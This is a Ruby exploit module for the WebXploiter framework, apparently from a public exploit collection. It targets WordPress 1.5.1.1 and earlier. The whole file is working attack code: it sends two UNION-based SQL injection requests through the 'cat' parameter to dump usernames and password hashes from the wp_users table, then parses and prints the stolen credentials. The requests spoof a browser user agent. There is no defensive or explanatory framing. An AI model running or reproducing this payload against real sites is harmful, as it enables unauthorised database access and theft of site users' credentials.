class WebXploit < WXf::WXfmod_Factory::Exploit
  include WXf::WXfassists::General::MechReq

def initialize
  super(
   'Name'        => 'Wordpress <= 1.5.1.1 SQLi',
   'Version'     => '1.0',
   'Description' => %q{
 	Username / Password hash dump for  Wordpress <= 1.5.1.1
                    },
   'Author'      => [ 'Alberto Trivero', 'John M. Poulin' ],
   'License'     => WXF_LICENSE
  )

  init_opts([
  	OptString.new('HTTP_USER', [false, "HTTP Username", ""]),
	OptString.new('HTTP_PASS', [false, "HTTP Password", ""]),
  ])

end

def exploit
	# Prepare SQLi
	# 	Attempt two requests
	req_1 = rurl + "index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*"
	
	req_2 = rurl + "index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*"

	res_1 = send_request_cgi({
                    'method'=> 'GET',
                    'RURL'  =>  req_1,
                    'UA' => "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    })

	res_2 = send_request_cgi({
                    'method'=> 'GET',
                    'RURL'  =>  req_2,
                    'UA' => "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    })

	if (res_1 and res_1.respond_to?('code')) or (res_2 and res_2.respond_to?('code'))
		if res_1.code == "200" 
			pass = grabPass(res_1.body)
		end

		if res_2.code == "200"
			pass = grabPass(res_2.body)
		end
	end

	if pass.nil?
		print_error("Exploit Unsuccessful")
	end
end

# Grab Username and Password hash from content body
def grabPass(cnt)
	res = cnt.match(/([a-z0-9]{32}):(.*?):/)

	if res
		print_good(res[2] + ":" + res[1])
		return res[2] + ":" + res[1]
	end
end

end

